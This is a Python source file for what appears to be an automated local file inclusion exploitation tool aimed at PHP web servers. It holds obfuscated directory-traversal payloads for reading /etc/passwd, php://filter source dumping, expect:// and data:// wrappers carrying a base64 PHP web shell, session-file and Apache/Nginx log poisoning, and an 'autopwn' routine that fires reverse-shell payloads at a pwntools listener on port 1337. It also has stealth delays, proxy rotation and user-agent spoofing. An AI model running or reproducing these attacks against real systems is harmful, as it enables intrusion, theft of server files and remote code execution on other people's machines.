import re
import requests
import urllib
from UAList import fetchUA, fetchAgent
from urllib.parse import quote
from urllib.request import urlopen
from urllib.error import URLError, HTTPError
from termcolor import colored
from proxies_list import fetch_proxy
from requests.auth import HTTPBasicAuth
from pwn import listen
import threading
import random
import time
import pathlib
import os
import base64

class Payload:

	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], override_poc=False, verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
		requests.packages.urllib3.disable_warnings() # Comment out to stop suppressing warnings.
		self.url = url.strip()
		self.verbosity = verbosity
		self.outfile = outfile
		self.crawler = crawler
		self.creds = creds
		self.batch = batch
		self.stealth = stealth
		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66", "&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;", "\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57\56\56\57"]
		# poc -> Proof Of Concept (Change it if you want)
		self.poc = poc
		self.override_poc = override_poc

		# Filter
		# The quote method automatically url encodes the string except for the "."
		self.filterPaths = ["%2Fetc%2Fpasswd", quote("index"), quote("index.php"), quote("index.html")]
		self.filterBase = quote("php://filter/read=convert.base64-encode/resource=")

		# Headers. One is without url encoding beacause it encodes also the base64 and the server doesn't like that
		self.phpHeaders = [quote("expect://id"), "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id"]

		# PHPSESSID Cookie
		self.cookiePath = "/var/lib/php/sessions/sess_"

		# payload for RCE
		self.payload = "<?php system($_GET['cmd']); ?>"
		if attempt_shell:
			self.conn = False
			self.payloads = self.GetPayloads(attempt_shell, 1337)

		self.proxies = proxies
		if initiate:
			self.Attack(attempt_shell, mode, force)



	def InvokeShell(self, exploit, payload):
		# Give some time to bind the listener
		time.sleep(2)
		print(colored("[+]", 'green') + " Triggering payload... " + exploit + payload)
		self.hit(exploit + payload)
		time.sleep(2)
		if not self.conn:
			print(colored("[-]", 'red') + " Exploit completed but no sessions were created!")
			if self.batch == None:
				print(colored("Do you want to try other payloads? (Y/n) ", 'yellow'), end='')
				ans = str(input())
				if 'n' in ans.lower():
					os._exit(0)
			else:
				if not self.batch:
					os._exit(0)
			session = False
			for payload in self.payloads:
				print(colored("[*]", 'yellow') + " Trying: " + payload)
				self.hit(exploit + payload)
				time.sleep(2)
				if self.conn:
					print(colored('[+]', 'green') + ' Exploit Completed! Session Created...')
					session = True
					break

			if not session:
				print(colored('[-]','red') + ' No payload worked. Exiting...')
				os._exit(0)



	def GetPayloads(self, ip, port):
		cwd = os.path.dirname(__file__)
		with open(str(cwd) + "/misc.txt") as handle:
			payloads = handle.read().split('\n')
			for i in range(len(payloads)):
				payloads[i] = payloads[i].replace('{ip}', ip).replace('{port}', str(port))
		return payloads


	# TO DO Threading doesn't work
	# Added thread support for the attacks which speeds things up significantly!
	def Attack(self, attempt_shell=False, mode=0, force=False):
		if not force and not self.urlCheck():
			return
		
		dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
		dirThread.start()
		filterThread = threading.Thread(target=self.filterCheck, args=[])
		filterThread.start()
		# The following three are used for autopwn purposes. You can thread them but you need to join them before jumping into autopwn(). Won't do this at this point. It's fast in any case.
		headerres = self.headerCheck()
		cookieres = self.cookieCheck()
		logres = self.logPoisonCheck()

		if attempt_shell:
			self.autopwn(attempt_shell, cookieres, headerres, logres, mode)



	def autopwn(self, attempt_shell, cookieres, headerres, logres, mode=0):
		print(headerres)
		payload = self.payloads[mode]
		if not cookieres and not headerres and not logres:
			print(colored("[-]",'red') + " No RCE Found. Autopwn impossible...")
			return
		print(colored("[+]", 'green') + " RCE Detected!")
		if logres:
			# We don't have to gain rce from all the verified rce vectors. We just need one!
			log = logres[0]
			print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable log file: {log}")
			exploit = log + f'&cmd='
				
		elif headerres:
			exploit = headerres[0][:-2] 
			print(colored(f"[+]",'green') + " Attempting to pwn through vulnerable header: {header}")

		elif cookieres:
			exploit = headerres[0][:-2]
			print(colored(f"[+]", 'green') + " Attempting to pwn through vulnerable cookie: {cookie}")


		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit, payload]) #It works, don't touch it!
		ExploitThread.start()
		# Spin up the listener to catch the revshell and fire out the exploit
		l = listen(1337)
		self.conn = l.wait_for_connection()
		l.interactive()
		print("[*] Session Closed.")



	# It sends the url as is without decoding it first, so that it can bypass filters that look for ..
	def hit(self, url):
		if self.stealth:
			time.sleep(random.randint(2,6)) # Sleep for a random interval of seconds (between 2 and 6) per request to be more stealthy
		if self.proxies:
			proxy_support = urllib.request.ProxyHandler(fetch_proxy())
			opener = urllib.request.build_opener(proxy_support)
			urllib.request.install_opener(opener)
		try:
			if self.creds is not None:
				response = self.cred(url)
			else:
				response = requests.get(url, verify=False)
			response = str(response.text)
			return self.stripHtmlTags(response)
		
		except HTTPError as e:
			print(colored('[-]', 'red', attrs=['bold']) + ' Error code: ' + str(e))		
		except URLError as e:
			print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ' + str(e))
		except http.client.RemoteDisconnected as e:
   			print(colored('[-]','red', attrs['bold']) + ' Reason: ' +  str(e) + "\nAborting endpoint...")



	# Checks if the url is valid
	def urlCheck(self):
		# Extract the domain with protocol from the provided url
		self.domain = urllib.parse.urlparse(self.url).scheme + '://' + urllib.parse.urlparse(self.url).netloc
		try:
			print("Checking Remote Server Health")
			if self.proxies:
				ret = requests.get(self.domain, headers=fetchUA(), proxies=fetch_proxy(), verify=False)
			elif self.creds is not None:
				ret = self.cred(self.url)
			else:
				ret = requests.get(self.domain, headers=fetchUA(), verify=False)
			if ret.status_code == 200:
				print(colored(str(ret.status_code) +" - OK",'green'))
				return True
			else:
				print(colored(str(ret.status_code) + " - DEAD", 'red'))
				return False	
		except requests.exceptions.ConnectionError as e:
			print(colored('[-] Endpoint DEAD', 'red'))
			print(colored('[-] Failed with error: ', 'red') + str(e))
			return False
		except Exception as e:
			print(colored(str(ret.status_code) + " - DEAD", 'red'))
			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
			return False



	def cred(self, url):
		list_creds = self.creds.split(':')
		user = list_creds[0]
		passwd = list_creds[1]
		ret = requests.get(url, headers=fetchUA(), verify=False, auth=HTTPBasicAuth(user, passwd))
		return(ret)
			

			
	# Strips all HTML tags from the HTTP response	
	def stripHtmlTags(self, tag):
		htmlchars = re.compile('<.*?>')
		clean = re.sub(htmlchars, '', tag)
		return clean



	# Checks for directory traversal
	def dirTraversalCheck(self):
		for traversal in self.linux_dirTraversal:
			for poc in self.poc:
				if not self.override_poc:
					compUrl = self.url + traversal + poc
				else:
					compUrl = self.url + poc
				if self.verbosity > 1:
					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
				clean = self.hit(compUrl)
				if 'root:x' in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl)
					if self.outfile is not None:
						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Directory traversal found with ' + compUrl + '\n')
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')



	# Checks for Remote Code Execution with php headers
	def headerCheck(self):
		rce = []
		for header in self.phpHeaders:
			compUrl = self.url + header
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			if 'uid=' in clean.lower():
				print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl)
				if self.outfile is not None:
					self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with ' + compUrl + '\n')
				rce.append(compUrl)
			else:
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
		if len(rce) == 0:
			return False
		return rce
	
	
	
	# Checks if it can retrieve files with the php filter	
	def filterCheck(self):
		for path in self.filterPaths:
			compUrl = self.url + self.filterBase + path
			if self.verbosity > 1:
				print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
			clean = self.hit(compUrl)
			words = clean.split()
			for word in words:
				try:
					base = base64.b64decode(word).decode()
				except Exception as e:
					continue
				if base.__contains__('<?php') or base.__contains__('<script'):
					print(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl)
					if self.outfile is not None:
						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Files can be retrieved with php filter like so (encoded in base64) ' + compUrl + '\n')			
					else:
						if self.verbosity > 0:
							print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')
			else:	
				if self.verbosity > 0:
					print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed.')



	# Checks if the PHPSESSID cookie can be exploited
	def cookieCheck(self):
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
		s = requests.Session()
		session = s.get(self.url, headers=fetchUA())
		cookies = session.cookies.get_dict()
		rce = []
		for cookie in cookies:
			if 'phpsessid' in cookie.lower():
				# it gets the value of the cookie
				value = session.cookies[cookie]
				#send the payload to see if there is RCE
				newUrl = self.url + self.payload
				s.get(newUrl, headers=fetchUA())
				# open the file to find if the command worked
				compUrl = self.url + self.cookiePath + value + "&cmd=id"
				clean = self.hit(compUrl)	
				if 'uid='  in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned')
					if self.outfile is not None:
						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with the PHPSESSID cookie and the file ' + self.cookiePath + '[cookie value] can be poisoned\n')
					rce.append(compUrl)
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')
		if len(rce) == 0:
			return False
		return rce




	def logPoisonCheck(self):
		headers = {"User-Agent": self.payload}
		response = requests.get(self.url, headers=headers)
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')

		# Check to see if the server leaks a Server Header.
		if not 'Server' in response.headers.keys():
			print(colored('[-]', 'red') + " Server does not leak the Server Header. It's impossible to tell if it's running nginx or apache.")
			if self.batch == False:
				return False
			else:
				if self.batch == True:
					ans = True
				else:
					print(colored('[?]', 'yellow') + " Hit every known server type? [y/N]: ", end='')
					ans = str(input())

					if 'y' in ans.lower():
						ans = True
					else:
						ans = False
				if ans == True:
					# Attempt to hit apache files first
					ret = self.hitApache()	
					# If we get a hit then return that. (No need to hit Nginx files)
					if ret:
						return ret
					# Otherwise hit Nginx Files and return the results no matter what they are
					return self.hitNginx()

		# checks the type of the server
		if "apache" in response.headers['Server'].lower() or 'litespeed' in response.headers['Server'].lower():
			return self.hitApache()			

		elif "nginx" in response.headers['Server'].lower():
			return self.hitNginx()
		else:
			print(colored('[-]', 'red', attrs=['bold']) + " The server type " + response.headers['Server'] + " is not supported!!!")
		return False


	def hitApache(self):
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
		# Apache logs with the litespeed variation
		logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/usr/local/apache/logs/access_log")]
		rce = []
		for d_path in self.linux_dirTraversal:
			for l_path in logPath:
				pathth = self.url + d_path + l_path
				compUrl = pathth + "&cmd=id"
				clean = self.hit(compUrl)
				if "uid=" in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth)
					if self.outfile is not None:
						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathth + '\n')
					rce.append(pathth)
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')		
		if len(rce) == 0:
			return False
		return rce

	def hitNginx(self):
		# Nginx logs
		if self.verbosity > 1:
			print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
		log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
		rce = []
		for d_path in self.linux_dirTraversal:
			for l_path in log:
				pathh = self.url + d_path + l_path
				compUrl = pathh + "&cmd=id"
				clean = self.hit(compUrl)
				if "uid=" in clean.lower():
					print(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh)
					if self.outfile is not None:
						self.outfile.write(colored('[+]', 'green', attrs=['bold']) + ' Remote code execution (RCE) found with log poisong with the path ' + pathh + '\n')
					rce.append(pathh)
				else:
					if self.verbosity > 0:
						print(colored('[-]', 'red', attrs=['bold']) + f' {compUrl} payload failed')	
		if len(rce) == 0: 
			return False
		return rce
